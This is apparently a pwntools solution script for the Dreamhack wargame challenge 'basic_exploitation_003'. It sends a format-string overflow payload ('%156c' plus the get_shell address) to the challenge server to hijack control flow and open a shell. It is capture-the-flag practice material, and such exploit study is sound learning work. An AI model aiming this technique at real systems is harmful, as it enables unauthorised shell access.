from pwn import *

p =remote('host3.dreamhack.games', 23530)
e = ELF('./basic_exploitation_003')

get_shell = e.symbols['get_shell']

payload = b"%156c" + p32(get_shell)

p.sendline(payload)
p.interactive()

